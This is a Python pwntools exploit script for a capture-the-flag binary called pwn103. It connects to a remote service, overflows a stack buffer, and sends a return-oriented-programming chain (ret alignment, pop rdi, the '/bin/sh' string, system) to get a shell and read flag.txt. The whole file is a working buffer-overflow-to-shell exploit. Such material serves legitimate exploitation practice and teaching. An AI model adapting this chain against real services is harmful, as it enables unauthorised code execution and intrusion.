#!/usr/bin/env python3
from pwn import *
import dotenv, os

dotenv.load_dotenv("../.env")
RHOST, RPORT = str(os.environ["RHOST"]), 9003

exe = ELF("./pwn103-1644300337872.pwn103")

context.binary = exe
# context.log_level = "debug"



def conn():
    # r = process([exe.path])
    r = remote(RHOST, RPORT)

    return r


def main():
    io = conn()

    rop = ROP(exe)
    ret = rop.find_gadget(['ret']).address           # alignment gadget
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address  # the gadget you "use"
    system = exe.plt['system']
    binsh = next(exe.search(b'/bin/sh\x00'))

    payload = b'A' * (32 + 8)
    admins_only = 0x000401554
    payload += p64(admins_only)
    payload += p64(ret)
    payload += p64(pop_rdi)  # <-- using the gadget: it will pop next value into RDI
    payload += p64(binsh)    # value that goes into RDI
    payload += p64(system)
    io.sendlineafter(b"channel: ", b"3")
    io.sendlineafter(b"[pwner]: ", payload)
    io.sendline(b"cat flag.txt")

    io.interactive()


if __name__ == "__main__":
    main()
